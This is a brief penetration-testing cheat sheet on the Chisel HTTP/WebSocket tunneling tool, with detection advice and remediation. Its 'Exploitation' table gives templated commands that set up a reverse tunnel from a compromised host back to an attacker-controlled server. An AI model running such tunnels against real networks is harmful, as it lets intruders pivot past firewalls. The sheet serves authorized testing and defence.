# Chisel

> Fast TCP/UDP tunnel over HTTP/WebSocket. Useful for pivoting through firewalls during authorized engagements only.

## TL;DR
- Server (`--reverse`) listens on the attacker; client on the compromised host connects back.
- `R:<bind>:<dest>` on the client opens a remote-forward through the server.
- Single statically linked Go binary; no dependencies on the target.
- Detection: outbound HTTP/WebSocket to unexpected hosts; egress filtering closes most paths.

## Detection / Discovery
| Command | Description |
| --- | --- |
| `./chisel --help` | Show client/server options |
| `./chisel --version` | Local version check |

## Exploitation
| Command | Description |
| --- | --- |
| `./chisel client <IP>:<PORT> R:<NEW_PORT_ON_ATTACKER_MACHINE>:127.0.0.1:<PORT_ON_CLIENT>/tcp` | CLIENT — reverse-forward a local target port through to attacker |
| `./chisel server -p <PORT_ON_ATTACKER_MACHINE> --reverse` | SERVER — accept reverse tunnels from clients |

## Defence / Remediation
- Egress filter outbound HTTP/WebSocket to the public internet from server segments (CWE-441 unintended-proxy).
- Alert on long-lived outbound TLS/WebSocket connections from non-user hosts.
- Application-aware proxy: inspect WebSocket upgrades, block unknown sub-protocols.
- Endpoint controls: prohibit user-mode execution of unsigned static Go binaries on production servers.

## Sources
- chisel upstream: https://github.com/jpillora/chisel
- HackTricks pivoting & tunneling: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html
- MITRE ATT&CK T1572 Protocol Tunneling: https://attack.mitre.org/techniques/T1572/
